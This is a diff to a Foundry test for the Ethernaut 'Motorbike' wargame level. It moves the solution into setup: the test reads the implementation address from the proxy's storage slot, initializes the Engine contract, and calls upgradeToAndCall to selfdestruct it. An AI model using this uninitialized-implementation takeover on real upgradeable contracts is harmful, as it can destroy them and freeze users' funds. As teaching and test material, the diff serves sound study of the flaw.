@@ -39,8 +39,15 @@ contract TestMotorbike is Test, Utils {
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
+        // Since everything runs in a single transaction within Foundry, 'selfdestruct' won't be triggered.
+        // Therefore, we solve the challenge here and then run the tests.
         vm.startPrank(player);
         instance = payable(createLevelInstance(ethernaut, Level(address(factory)), 0));
+        address engine = address(
+            uint160(uint256(vm.load(instance, hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")))
+        );
+        Engine(engine).initialize();
+        Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("done()"));
         vm.stopPrank();
     }
 
@@ -50,19 +57,13 @@ contract TestMotorbike is Test, Utils {
 
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
-        vm.startPrank(player);
-        assertFalse(submitLevelInstance(ethernaut, instance));
+        vm.expectRevert("This instance doesn't belong to the current user");
+        submitLevelInstance(ethernaut, instance);
     }
 
     /// @notice Test the solution for the level.
     function testSolve() public {
         vm.startPrank(player);
-
-        address engine = address(
-            uint160(uint256(vm.load(instance, hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")))
-        );
-        Engine(engine).initialize();
-        Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("done()"));
         assertTrue(submitLevelInstance(ethernaut, instance));
     }
 
